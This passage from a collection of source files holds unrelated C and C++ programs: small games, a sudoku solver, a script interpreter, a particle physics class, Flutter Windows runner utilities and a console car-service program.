{\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i+1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i+1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i+1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif ((x > 0) && (oldPixels[i][x-1])) neighborsAlive++;\r\n\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i][x+1])) neighborsAlive++;\r\n\r\n\t\t\t\tnewPixels[i][x] = true;\r\n\t\t\t\tif (oldPixels[i][x] && !(neighborsAlive == 3)) newPixels[i][x] = false;\r\n\t\t\t\telse if (!oldPixels[i][x] && !((neighborsAlive == 2) || (neighborsAlive == 3))) newPixels[i][x] = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\t// only stay alive at 3 pixels\r\n\t\t\tcase 2: {\r\n\t\t\t\tuint8_t neighborsAlive = 0;\r\n\t\t\t\tif (i > 0) {\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i-1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i-1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i-1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif (i < SCREENHEIGHT/SCALEFACTOR-1) {\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i+1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i+1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i+1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif ((x > 0) && (oldPixels[i][x-1])) neighborsAlive++;\r\n\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i][x+1])) neighborsAlive++;\r\n\r\n\t\t\t\tnewPixels[i][x] = true;\r\n\t\t\t\tif (oldPixels[i][x] && !(neighborsAlive == 3)) newPixels[i][x] = false;\r\n\t\t\t\tel",
    "#include<SDL2/SDL.h>\r\n#include<stdio.h>\r\n#include<iterator>\r\n#include<algorithm>\r\n#include<vector>\r\n#include<utility>\r\n#include<tuple>\r\nusing namespace std;\r\n\r\nconst char* nameOfGame = \"ShootEmDown\";\r\n\r\nconst int SCREEN_WIDTH = 600;\r\nconst int SCREEN_HEIGHT = 400;\r\n\r\nSDL_Window* gWindow = NULL;\r\nSDL_Surface* gScreenSurface = NULL;\r\n\r\n#include \"include/initialise.h\"\r\n#include \"include/game.h\"\r\n\r\nint main(int argc, char* argv[])\r\n{\r\n\tif (!init(nameOfGame))\r\n\t{\r\n\t\tprintf(\"Failed to initialize!\\n\");\r\n\t}\r\n\telse\r\n\t{\r\n\t\tpair<SDL_Surface*, bool> TitleScreenResult = game.TitleScreen();\r\n\t\t\r\n\t\tif(!TitleScreenResult.second)\r\n\t\t{\r\n\t\t\tprintf(\"Failed to load media!\\n\");\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tSDL_Event e;\r\n\t\t\tbool quit = false;\r\n\t\t\tint orphan_event_number = 0;\r\n\t\t\tint Mouse_X =NULL, Mouse_Y = NULL;\r\n\t\t\tUint32 MouseButtonState = NULL;\r\n\t\t\twhile(!quit)\r\n\t\t\t{\r\n\t\t\t\twhile( SDL_PollEvent(&e) != 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tswitch(e.type){\r\n\t\t\t\t\t\tcase SDL_QUIT:\r\n\t\t\t\t\t\t\tquit = true;\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase SDL_MOUSEMOTION:\r\n\t\t\t\t\t\t\tMouseButtonState = SDL_GetMouseState(&Mouse_X, &Mouse_Y);\r\n\t\t\t\t\t\t\tprintf(\"mouse coordinates X: %d and Y: %d\\n\",Mouse_X, Mouse_Y);\r\n\t\t\t\t\t\t\tswitch(MouseButtonState){\r\n\t\t\t\t\t\t\t\tcase SDL_BUTTON(1):\r\n\t\t\t\t\t\t\t\t\tprintf(\"left button\\n\");\r\n\t\t\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\t\tcase SDL_BUTTON(2):\r\n\t\t\t\t\t\t\t\t\tprintf(\"Middle button\\n\");\r\n\t\t\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\t\tcase SDL_BUTTON(3):\r\n\t\t\t\t\t\t\t\t\tprintf(\"Right button\\n\");\r\n\t\t\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\t\tdefault:\r\n\t\t\t\t\t\t\t\t\tprintf(\"No Drag Click\\n\");\r\n\t\t\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase SDL_MOUSEBUTTONDOWN:\r\n\t\t\t\t\t\t\tprintf(\"Mouse button clicked! at (%d, %d) with state %d\", e.button.x, e.button.y, e.button.state);\r\n\t\t\t\t\t\t\tgame.mover(e.button.x, e.button.y, e.button.state);\r\n\t\t\t\t\t\tcase SDL_MOUSEBUTTONUP:\r\n\t\t\t\t\t\t\tprintf(\"\t\tClick lifted\\n\");\r\n\t\t\t\t\t\tdefault:\r\n\t\t\t\t\t\t\tprintf(\"Event %d detected\\n\", orphan_event_number);\r\n\t\t\t\t\t\t\torphan_event_number++;\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\t\t\t\r\n\t\tSDL_FreeSurface(TitleScreenResult.first);\r\n\t}\r\n\r\n\t\r\n\tclose();\r\n\r\n\treturn 0;\r\n}",
    "#include <random>\n#include <chrono>\n#include <map>\n#include <iostream>\n#include <queue>\n#include <cstring>\n#include <vector>\n#include <algorithm>\n\n#define LEFT_ARROW 68\n#define UP_ARROW 65\n#define RIGHT_ARROW 67\n#define DOWN_ARROW 66\n\n#define LINE_SIZE \"stty size | cut -d' ' -f1\"\n#define COLUMN_SIZE \"stty size | cut -d' ' -f2\"\n\n#define fundo0 \"  \"\n#define fundo1 \"\\033[0;40m  \\033[0m\"\n#define parede \"\\033[0;47m  \\033[0m\"\n#define player0 \"\\033[48;2;80;200;200m  \\033[0m\"\n#define player1 \"\\033[0;42m  \\033[0m\"\n#define coletavel \"\\033[48;2;242;238;2m  \\033[0m\"\n#define fim \"\\033[48;2;180;20;255m  \\033[0m\"\n\nstd::mt19937 rng(std::chrono::steady_clock::now().time_since_epoch().count());\n\nstd::map<char, int> dictx = {{UP_ARROW, -1}, {DOWN_ARROW, +1}, {'w', -1}, {'s', +1}};\nstd::map<char, int> dicty = {{LEFT_ARROW, -1}, {RIGHT_ARROW, +1}, {'a', -1}, {'d', +1}};\n\nint dx[4]={0, 1, 0, -1}, dy[4]={1, 0, -1, 0};\n\nstd::vector<std::vector<int>> mapa;\n\nbool coletou, acabou;\n\nint columns, lines;\n\nstd::pair<int,int> pos;\n\nint16_t getTerminalSize(std::string command) {\n    FILE* fpipe = popen(command.c_str(), \"r\");\n\n\tchar buffer[128];\n\n    int a = atoi(fgets(buffer, 128, fpipe));\n\n    pclose(fpipe);\n    return a;\n}\n\nvoid move(int ox, int oy){\n\tif(mapa[ox][oy] == 1 || (mapa[ox][oy] == 4 && !coletou))return;\n\telse if(mapa[ox][oy] == 4)acabou=true;\n\telse if(mapa[ox][oy] == 3)coletou=true;\n\n\tmapa[pos.first][pos.second] = 0;\n\tmapa[ox][oy] = 2;\n\tpos=std::make_pair(ox, oy);\n}\n\nvoid imprime(){\n\tsystem(\"clear\");\n\n\tstd::cout << (coletou ? \"va para o bloco roxo para ganhar\" : \"colete o bloco amarelo\") << \"\\n\\n\";\n\n\tfor(int i = 0; i <= lines+1; i++){\n\t\tfor(int j = 0; j <= columns+1; j++){\n\t\t\tif(mapa[i][j] == 0) {\n\t\t\t\tstd::cout << (((i+j)%2) ? fundo1 : fundo0);\n\t\t\t}\n\t\t\telse if(mapa[i][j] == 1) {\n\t\t\t\tstd::cout << parede;\n\t\t\t}\n\t\t\telse if(mapa[i][j] == 2) {\n\t\t\t\tstd::cout << (coletou ? player1 : player0);\n\t\t\t}\n\t\t\telse if(mapa[i][j] == 3) {\n\t\t\t\tstd::cout << coletavel;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tstd::cout << fim;\n\t\t\t}\n\t\t}\n\t\tstd::cout << '\\n';\n\t}\n\tstd::cout << '\\n';\n}\n\nbool caminho(std::pair<int,int> ini, std::pair<int,int> obj){\n\tstd::vector<std::vector<std::pair<int,int>>> pai;\n\tpai.resize(lines+2);\n\n\tfor(int i = 0; i <= lines+1; i++){\n\t\tpai[i].resize(columns+2);\n\t\tfor(int j = 0; j <= columns+1; j++)\n\t\t\tpai[i][j] = std::make_pair(-1, -1);\n\t}\n\n\tpai[ini.first][ini.second] = std::make_pair(0, 0);\n\n\tstd::queue<std::pair<int,int>> q;\n\tq.push(ini);\n\n\twhile(q.size()){\n\t\tint cx = q.front().first, cy = q.front().second;\n\t\tq.pop();\n\n\t\tif(cx == obj.first && cy == obj.second)break;\n\n\t\tfor(int p = 0; p < 4; p++){\n\t\t\tint nx = cx+dx[p], ny = cy+dy[p];\n\n\t\t\tif(pai[nx][ny].first != -1 || mapa[nx][ny] == 1 || (mapa[nx][ny] == 4 && (nx != obj.first || ny != obj.second)))continue;\n\n\t\t\tpai[nx][ny] = std::make_pair(cx, cy);\n\t\t\tq.push({nx, ny});\n\t\t}\n\t}\n\n\treturn (pai[obj.first][obj.second].first != -1);\n}\n\nchar keyboard_input(){\n\tsystem(\"stty raw -echo\");\n\n\tchar inp = (char) std::cin.get();\n\n\tsystem(\"stty cooked echo\");\n\n\treturn inp;\n}\n\nvoid gerar_mapa(){\n\tmapa.resize(lines+2);\n\n\tfor(int i = 0; i <= lines+1; i++)\n\t\tmapa[i].resize(columns+2);\n\n\twhile(1){\n\t\tfor(int i = 0; i <= lines+1; i++)\n\t\t\tfor(int j = 0; j <= columns+1; j++)\n\t\t\t\tmapa[i][j] = 0;\n\n\t\tcoletou = false, acabou = false;\n\n\n\t\tfor(int i = 0; i <= lines+1; i++){\n\t\t\tmapa[i][0] = 1;\n\t\t\tmapa[i][columns+1] = 1;\n\t\t}\n\t\tfor(int j = 0; j <= columns+1; j++){\n\t\t\tmapa[0][j] = 1;\n\t\t\tmapa[lines+1][j] = 1;\n\t\t}\n\n\n\t\tstd::vector<std::pair<int,int>> pontos;\n\n\t\tfor(int i = 1; i <= lines; i++)\n\t\t\tfor(int j = 1; j <= columns; j++)\n\t\t\t\tpontos.push_back({i, j});\n\n\t\tstd::shuffle(pontos.begin(), pontos.end(), rng);\n\n\t\tmapa[pontos[0].first][pontos[0].second] = 2;\n\t\tmapa[pontos[1].first][pontos[1].second] = 3;\n\t\tmapa[pontos[2].first][pontos[2].second] = 4;\n\n\t\tpos = pontos[0];\n\n\t\tint qtd = (int)(0.4*lines*columns), ptr = 3;\n\n\t\twhile(qtd--){\t\t\n\t\t\tmapa[pontos[ptr].first][pontos[ptr].second] = 1;\n\t\t\tptr++;\n\t\t}\n\n\t\tif(!caminho(pontos[0], pontos[1]) || !caminho(pontos[0], pontos[2]))continue;\n\n\t\tbreak;\n\t}\n}\n\nint main(){\n\tfor (uint8_t i = 1; true; i++){\n\t\tcolumns = std::max(getTerminalSize(COLUMN_SIZE)/2-2, 14);\n\t\tlines = std::max(getTerminalSize(LINE_SIZE)-7, 4);\n\n\t\tif(lines*5 < columns)columns = lines*5;\n\t\telse if(columns*5 < lines)lines = columns*5;\n\n\t\tgerar_mapa();\n\t\t\n\t\timprime();\n\t\tstd::cout << \"\\033[31mRound:\\t\" << (int)i << \"\\033[0m\" << '\\n';\n\n\t\twhile(!acabou){\n\t\t\tchar inp = keyboard_input();\n\n\t\t\tif (inp == 3) {\n\t\t\t\treturn 0;\n\t\t\t}\n\n\t\t\tint nx = pos.first + dictx[inp], ny = pos.second + dicty[inp];\n\n\t\t\tmove(nx, ny);\n\t\t\n\t\t\timprime();\n\t\t\tstd::cout << \"\\033[31mRound:\\t\" << (int)i << \"\\033[0m\" << '\\n';\n\n\t\t}\n\n\t}\n\t\n\treturn 0;\n}\n",
    "#include \"tucan_statement.h\"\n\nnamespace tucan_script\n{\n\ttucan_statement_while::tucan_statement_while(std::shared_ptr<tucan_expression> condition) :\n\t\tm_condition(std::move(condition)), m_running(false), m_continue(false) {}\n\n\tvoid tucan_statement_while::execute()\n\t{\n\t\tm_running = true;\n\t\tm_condition->execute();\n\t\twhile (m_condition->toBoolean())\n\t\t{\n\t\t\tfor (auto& executable : executables)\n\t\t\t{\n\t\t\t\texecutable->execute();\n\n\t\t\t\tif (m_continue)\n\t\t\t\t{\n\t\t\t\t\tm_continue = false;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\tif (!m_running) return;\n\t\t\t}\n\n\t\t\tm_condition->execute();\n\t\t}\n\t}\n\n\tvoid tucan_statement_while::break_loop()\n\t{\n\t\tm_running = false;\n\t}\n\n\tvoid tucan_statement_while::continue_loop()\n\t{\n\t\tm_continue = true;\n\t}\n\n\ttucan_statement_for::tucan_statement_for(const std::vector<std::shared_ptr<tucan_operable>>& variables, std::shared_ptr<tucan_expression> array) :\n\t\tm_variables(variables), m_array(array), m_running(false), m_continue(false) {}\n\n\tvoid tucan_statement_for::execute()\n\t{\n\t\tm_running = true;\n\t\tm_array->execute();\n\t\tfor (size_t index = 0; index < m_array->length(); index++)\n\t\t{\n\t\t\tauto& element = (*m_array).getElement(index);\n\n\t\t\tfor (auto& operable : m_variables)\n\t\t\t\toperable->set(element);\n\n\t\t\tfor (auto& executable : executables)\n\t\t\t{\n\t\t\t\texecutable->execute();\n\n\t\t\t\tif (m_continue)\n\t\t\t\t{\n\t\t\t\t\tm_continue = false;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\tif (!m_running) return;\n\t\t\t}\n\t\t}\n\t}\n\n\tvoid tucan_statement_for::break_loop()\n\t{\n\t\tm_running = false;\n\t}\n\n\tvoid tucan_statement_for::continue_loop()\n\t{\n\t\tm_continue = true;\n\t}\n\n\ttucan_statement_if::tucan_statement_if(std::shared_ptr<tucan_expression> condition) :\n\t\tm_condition(condition), m_running(false), m_continue(false) {}\n\n\tvoid tucan_statement_if::execute()\n\t{\n\t\tm_condition->execute();\n\n\t\tif (!m_condition->toBoolean()) return;\n\n\t\tfor (auto& executable : executables)\n\t\t\texecutable->execute();\n\t}\n}\n",
    "//\n// Created by solarbaron on 2.4.24.\n//\n\n#include \"fancy_border.h\"\n\nvoid printBorder(const std::string& text) {\n    // UTF-8 characters for the border\n    const char* topLeft = \"\\u250C\"; // \u250c\n    const char* topRight = \"\\u2510\"; // \u2510\n    const char* bottomLeft = \"\\u2514\"; // \u2514\n    const char* bottomRight = \"\\u2518\"; // \u2518\n    const char* horizontal = \"\\u2500\"; // \u2500\n    const char* vertical = \"\\u2502\"; // \u2502\n\n    std::istringstream stream(text);\n    std::string line;\n    std::vector<std::string> lines;\n    size_t maxLength = 0;\n    while (std::getline(stream, line)) {\n        lines.push_back(line);\n        if (line.length() > maxLength) {\n            maxLength = line.length();\n        }\n    }\n\n    // Calculate the width for the border based on the text length\n    int width = maxLength + 2; // Adding space for padding\n\n    // Print top border\n    std::cout << topLeft;\n    for (size_t i = 0; i < width; i++) std::cout << horizontal;\n    std::cout << topRight << std::endl;\n\n    //rewrite\n\n    //printw(topLeft\"\\n\");\n    //for (size_t i = 0; i < width; i++) printw(horizontal,\"\\n\");;\n    //printw(topRight,\"\\n\");\n\n    for (const auto& l : lines) {\n        std::cout << vertical << \" \" << l;\n        // Print spaces if the line is shorter than the longest line\n        for (size_t i = l.length(); i < maxLength; i++) {\n            std::cout << \" \";\n        }\n        std::cout << \" \" << vertical << std::endl;\n    }\n\n    // Print bottom border\n    std::cout << bottomLeft;\n    for (size_t i = 0; i < width; i++) std::cout << horizontal;\n    std::cout << bottomRight << std::endl;\n}\n",
    "//\n// Created by Jonas Langner on 31.03.24.\n//\n\n#include \"../../hdr/algorithm/SolvingOperation.h\"\n#include \"../../hdr/SudokuField.h\"\n#include \"../../hdr/algorithm/SudokuFieldSorter.h\"\n#include \"../../hdr/SudokuFieldGroup.h\"\n#include <iostream>\n\nsudoku::algorithm::SolvingOperation::SolvingOperation(SudokuField* sudoku_field_ptr, unsigned short no) noexcept:\nm_sudoku_field_ptr{sudoku_field_ptr}, m_number{no} {}\n\nsudoku::algorithm::SolvingOperation::SolvingOperation(sudoku::algorithm::SolvingOperation &&other) noexcept: m_sudoku_field_ptr{other.m_sudoku_field_ptr}, m_number{other.m_number}, m_effected_fields_by_perform{other.m_effected_fields_by_perform} {\n    other.m_sudoku_field_ptr = nullptr;\n    other.m_effected_fields_by_perform.clear();\n}\n\nsudoku::algorithm::SolvingOperation &sudoku::algorithm::SolvingOperation::operator=(sudoku::algorithm::SolvingOperation &&other) noexcept {\n    m_sudoku_field_ptr = other.m_sudoku_field_ptr;\n    m_number = other.m_number;\n    m_effected_fields_by_perform = other.m_effected_fields_by_perform;\n\n    other.m_sudoku_field_ptr = nullptr;\n    other.m_effected_fields_by_perform.clear();\n\n    return *this;\n}\n\nvoid sudoku::algorithm::SolvingOperation::for_each_related_sudoku_field_ptr(const std::function<void(SudokuField*)> &fnc) const {\n    std::for_each(m_sudoku_field_ptr->begin(), m_sudoku_field_ptr->end(), [fnc](sudoku::SudokuFieldGroup* sudoku_field_group) {\n        std::for_each(sudoku_field_group->begin(), sudoku_field_group->end(), [fnc](SudokuField* sudoku_field_ptr) {\n            fnc(sudoku_field_ptr);\n        });\n    });\n}\n\nvoid sudoku::algorithm::SolvingOperation::perform(sudoku::Sudoku &sudoku) {\n    m_sudoku_field_ptr->set_value(m_number);\n    SudokuFieldSorter &sorter{sudoku.m_sorter};\n\n    sorter.update(m_sudoku_field_ptr);\n    for_each_related_sudoku_field_ptr([this, &sorter](SudokuField* sudoku_field_ptr) {\n        if (sudoku_field_ptr->remove_number_option(m_number)) {\n            m_effected_fields_by_perform.push_back(sudoku_field_ptr);\n            sorter.update(sudoku_field_ptr);\n        }\n    });\n\n    sorter.flush();\n}\n\nvoid sudoku::algorithm::SolvingOperation::rollback(Sudoku &sudoku) noexcept {\n    auto const value{m_sudoku_field_ptr->value()};\n    m_sudoku_field_ptr->remove_value();\n\n    SudokuFieldSorter &sorter{sudoku.m_sorter};\n    sorter.update(m_sudoku_field_ptr);\n\n    std::for_each(m_effected_fields_by_perform.begin(), m_effected_fields_by_perform.end(), [&value, &sorter](SudokuField* sudoku_field_ptr){\n        if (sudoku_field_ptr->add_number_option(value)) {\n            sorter.update(sudoku_field_ptr);\n        }\n    });\n\n    sorter.flush();\n    m_effected_fields_by_perform.clear();\n}\n\nsudoku::SudokuField *sudoku::algorithm::SolvingOperation::sudoku_field() const noexcept {\n    return m_sudoku_field_ptr;\n}",
    "/*\r\n * Implementation file for the particle class.\r\n *\r\n * Part of the Cyclone physics system.\r\n *\r\n * Copyright (c) Icosagon 2003. All Rights Reserved.\r\n *\r\n * This software is distributed under licence. Use of this software\r\n * implies agreement with all terms and conditions of the accompanying\r\n * software licence.\r\n */\r\n\r\n#include <assert.h>\r\n#include <particle.h>\r\n\r\nusing namespace cyclone;\r\n\r\n\r\n/*\r\n * --------------------------------------------------------------------------\r\n * FUNCTIONS DECLARED IN HEADER:\r\n * --------------------------------------------------------------------------\r\n */\r\n\r\nvoid Particle::integrate(real duration)\r\n{\r\n    // We don't integrate things with zero mass.\r\n    if (inverseMass <= 0.0f) return;\r\n\r\n    assert(duration > 0.0);\r\n\r\n    // Update linear position.\r\n    position.addScaledVector(velocity, duration);\r\n\r\n    // Work out the acceleration from the force\r\n    Vector3 resultingAcc = acceleration;\r\n    resultingAcc.addScaledVector(forceAccum, inverseMass);\r\n\r\n    // Update linear velocity from the acceleration.\r\n    velocity.addScaledVector(resultingAcc, duration);\r\n\r\n    // Impose drag.\r\n    velocity *= real_pow(damping, duration);\r\n\r\n    // Clear the forces.\r\n    clearAccumulator();\r\n}\r\n\r\n\r\n\r\nvoid Particle::setMass(const real mass)\r\n{\r\n    assert(mass != 0);\r\n    Particle::inverseMass = ((real)1.0)/mass;\r\n}\r\n\r\nreal Particle::getMass() const\r\n{\r\n    if (inverseMass == 0) {\r\n        return REAL_MAX;\r\n    } else {\r\n        return ((real)1.0)/inverseMass;\r\n    }\r\n}\r\n\r\nvoid Particle::setInverseMass(const real inverseMass)\r\n{\r\n    Particle::inverseMass = inverseMass;\r\n}\r\n\r\nreal Particle::getInverseMass() const\r\n{\r\n    return inverseMass;\r\n}\r\n\r\nbool Particle::hasFiniteMass() const\r\n{\r\n    return inverseMass >= 0.0f;\r\n}\r\n\r\nvoid Particle::setDamping(const real damping)\r\n{\r\n    Particle::damping = damping;\r\n}\r\n\r\nreal Particle::getDamping() const\r\n{\r\n    return damping;\r\n}\r\n\r\nvoid Particle::setPosition(const Vector3 &position)\r\n{\r\n    Particle::position = position;\r\n}\r\n\r\nvoid Particle::setPosition(const real x, const real y, const real z)\r\n{\r\n    position.x = x;\r\n    position.y = y;\r\n    position.z = z;\r\n}\r\n\r\nvoid Particle::getPosition(Vector3 *position) const\r\n{\r\n    *position = Particle::position;\r\n}\r\n\r\nVector3 Particle::getPosition() const\r\n{\r\n    return position;\r\n}\r\n\r\nvoid Particle::setVelocity(const Vector3 &velocity)\r\n{\r\n    Particle::velocity = velocity;\r\n}\r\n\r\nvoid Particle::setVelocity(const real x, const real y, const real z)\r\n{\r\n    velocity.x = x;\r\n    velocity.y = y;\r\n    velocity.z = z;\r\n}\r\n\r\nvoid Particle::getVelocity(Vector3 *velocity) const\r\n{\r\n    *velocity = Particle::velocity;\r\n}\r\n\r\nVector3 Particle::getVelocity() const\r\n{\r\n    return velocity;\r\n}\r\n\r\nvoid Particle::setAcceleration(const Vector3 &acceleration)\r\n{\r\n    Particle::acceleration = acceleration;\r\n}\r\n\r\nvoid Particle::setAcceleration(const real x, const real y, const real z)\r\n{\r\n    acceleration.x = x;\r\n    acceleration.y = y;\r\n    acceleration.z = z;\r\n}\r\n\r\nvoid Particle::getAcceleration(Vector3 *acceleration) const\r\n{\r\n    *acceleration = Particle::acceleration;\r\n}\r\n\r\nVector3 Particle::getAcceleration() const\r\n{\r\n    return acceleration;\r\n}\r\n\r\nvoid Particle::clearAccumulator()\r\n{\r\n    forceAccum.clear();\r\n}\r\n\r\nvoid Particle::addForce(const Vector3 &force)\r\n{\r\n    forceAccum += force;\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"Service.hh\"\n#include <iostream>\n\nusing namespace std;\n\nint main() {\n\tsetlocale(LC_ALL, \"Polish\");\n\n\tstring carMake, carModel, customerName, customerAddress, customerPhone;\n\tint carYear;\n\tdouble partsCost, laborCost;\n\n\tcout << \"Creating new service...\" << endl;\n\tcout << \"Please enter the following information:\" << endl;\n\tcout << \"Enter car make: \";\n\tgetline(cin, carMake);\n\tcout << \"Enter car model: \";\n\tgetline(cin, carModel);\n\tcout << \"Enter car year: \";\n\tcin >> carYear;\n\tcin.ignore(); // Ignore the newline character left by previous input\n\tcout << \"Enter customer name: \";\n\tgetline(cin, customerName);\n\tcout << \"Enter customer address: \";\n\tgetline(cin, customerAddress);\n\tcout << \"Enter customer phone: \";\n\tgetline(cin, customerPhone);\n\tcout << \"Enter parts cost: \";\n\tcin >> partsCost;\n\tcout << \"Enter labor cost: \";\n\tcin >> laborCost;\n\n\tcout << endl << endl << \"Generating new service...\" << endl\n\t\t<< \"Creating new car...\" << endl;\n\tCar car(carMake, carModel, carYear);\n\n\tcout << \"Car created...\" << endl\n\t\t<< \"Creating new customer...\" << endl;\n\tCustomer customer(customerName, customerAddress, customerPhone);\n\n\tcout << \"Customer created...\" << endl\n\t\t<< \"Creating new service quote...\" << endl;\n\n\tServiceQuote serviceQuote(partsCost, laborCost);\n\tcout << \"Service quote created...\" << endl;\n\n\tService service(car, customer, serviceQuote);\n\tcout << \"Service created...\" << endl;\n\n\tcout << \"Service cost: \" << service.getCost() << endl;\n\n\tcout << endl << endl << endl << \"Press enter to exit...\";\n\treturn !!!getchar();\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, 